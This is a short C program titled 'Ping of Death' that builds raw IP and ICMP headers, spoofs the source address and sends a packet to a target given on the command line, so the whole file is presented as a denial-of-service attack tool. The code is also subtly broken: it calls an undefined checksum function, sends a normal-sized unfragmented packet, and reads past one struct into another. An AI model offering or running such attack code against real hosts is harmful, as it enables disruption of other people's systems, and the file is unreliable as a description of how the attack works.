// Author: William Selby
// Ping of Death

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>

int main(int argc, char *argv[])
{
	int sockfd;
	int one = 1;
	char *target;
	struct sockaddr_in dest;
	struct icmphdr icmp;
	struct iphdr ip;
	
	if(argc != 2){
		fprintf(stderr, "Usage: %s <target>\n", argv[0]);
		exit(1);
	}
	
	target = argv[1];
	
	/* Create the raw socket */
	if((sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)) == -1){
		perror("socket");
		exit(1);
	}
	
	/* IP_HDRINCL must be set on the socket so that
	   the kernel does not attempt to automatically add
	   a header to the packet */
	if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) == -1){
		perror("setsockopt");
		exit(1);
	}
	
	/* Fill out the IP header */
	ip.ihl = 5;
	ip.version = 4;
	ip.tos = 0;
	ip.tot_len = sizeof(struct iphdr) + sizeof(struct icmphdr);
	ip.id = htons(getpid());
	ip.frag_off = 0;
	ip.ttl = 255;
	ip.protocol = IPPROTO_ICMP;
	ip.check = 0;
	ip.saddr = inet_addr("192.168.1.1");
	ip.daddr = inet_addr(target);
	
	/* Calculate the IP checksum */
	ip.check = in_cksum((unsigned short *)&ip, sizeof(ip));
	
	/* Fill out the ICMP header */
	icmp.type = ICMP_ECHO;
	icmp.code = 0;
	icmp.un.echo.id = htons(getpid());
	icmp.un.echo.sequence = 0;
	icmp.checksum = in_cksum((unsigned short *)&icmp, sizeof(icmp));
	
	/* Fill out the sockaddr_in structure */
	dest.sin_family = AF_INET;
	dest.sin_addr.s_addr = ip.daddr;
	
	/* Send out the Ping of Death packet */
	sendto(sockfd, &ip, sizeof(ip) + sizeof(icmp), 0,
		(struct sockaddr *)&dest, sizeof(dest));
	
	return 0;
}
